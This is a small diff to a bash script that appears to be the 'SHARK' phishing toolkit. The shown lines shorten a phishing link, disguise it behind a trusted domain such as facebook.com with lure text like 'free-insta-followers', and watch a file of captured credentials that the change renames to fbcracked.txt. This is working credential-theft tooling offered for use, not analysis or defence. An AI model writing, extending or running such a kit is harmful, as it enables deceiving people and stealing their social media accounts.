@@ -291,7 +291,7 @@ ash() {
         short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
         shorter=${short#https://}
         echo
-        read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Mask Your url domain here [\e[1;91mEx. https://facebook.com\e[1;92m] :\e[m ' mask
+        read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Mask Your url domain here [\e[1;91mEx. https://facebook.com \e[1;92m] :\e[m ' mask
         echo
         url_checker $mask
         echo -e "\e[1;96m>>\e[1;93m Enter some words you like to mention in url \e[1;92m[\e[1;92mEx.free-insta-followers\e[1;92m] \e[m "
@@ -344,8 +344,8 @@ ash1() {
 			    echo 
 			    echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m=========================\e[92m"
 			    echo
-			    touch usernames.txt >> /dev/null 2>&1
-			    tail -f usernames.txt 
+			    touch fbcracked.txt >> /dev/null 2>&1
+			    tail -f  fbcracked.txt
 	
                             break;
 			     
